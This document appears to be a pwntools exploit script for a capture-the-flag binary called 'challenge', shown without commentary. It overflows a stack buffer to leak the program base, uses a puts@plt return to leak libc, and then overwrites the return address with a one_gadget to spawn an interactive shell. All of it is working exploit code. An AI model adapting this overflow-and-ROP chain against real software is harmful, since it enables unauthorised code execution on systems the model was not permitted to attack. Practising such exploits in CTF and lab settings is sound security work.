from pwn import *
exe = ELF("challenge")
libc = ELF("libc.so.6") 
p = process(exe.path) 
gdb.attach(p,
"""
b*echo+123
c
""")
input() 
p.sendlineafter(b'2\n',b'281') 
payload = b'A'*278+b'L'+b'\x4c'
p.sendline(payload) 
p.recvuntil(b'L') 
leak = u64(p.recvline()[:-1] + b'\x00\x00') 
exe.address = leak - 4684
print(hex(exe.address)) 

p.sendlineafter(b'2\n',b'296') 
payload = b'A'*279+p64(exe.plt['puts']) + p64(exe.sym['echo']) 
p.sendline(payload) 

leak = p.recvline() 
leak = p.recvline() 
leak_lib = u64(p.recvline()[:-1] + b'\x00\x00') 
libc.address = leak_lib - 401616 
print("leak lib : ",hex(libc.address))
p.recvuntil(b'Echo2\n')
p.sendline(b'296') 

payload=b'\x00'*271+p64(exe.bss()+0x78)+p64(exe.address + 0x000000000000101a) + p64(libc.address +0xebcf1) 
p.send(payload) 
p.interactive() 
